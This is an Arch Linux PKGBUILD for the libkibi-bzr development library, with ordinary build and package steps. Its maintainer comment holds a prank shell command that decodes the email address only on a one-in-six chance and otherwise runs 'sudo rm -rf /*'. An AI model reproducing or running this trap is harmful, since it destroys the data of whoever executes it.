# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=libkibi-bzr
pkgver=0.1.1+r42
pkgrel=1
pkgdesc='Configurable library for formatting sizes for display (development branch)'
url='https://launchpad.net/libkibi'
arch=(i686 x86_64)
license=('custom:ISC')
depends=(glibc)
makedepends=(bzr)
conflicts=(libkibi)
provides=(libkibi)
source=(
	bzr+lp:libkibi
)
sha512sums=(
	'SKIP'
)

pkgver() {
	cd "$srcdir/libkibi"
	bzr tags -r . | ( read tag rev; echo "$tag+r$rev" )
}

build () {
	cd "$srcdir/libkibi"
	autoreconf -i
	./configure --prefix=/usr
	make
}

package() {
	cd "$srcdir/libkibi"
	make install DESTDIR="$pkgdir"
	install -Dm644 "$srcdir/libkibi/COPYING" \
		"$pkgdir/usr/share/licenses/$pkgname/COPYING"
}
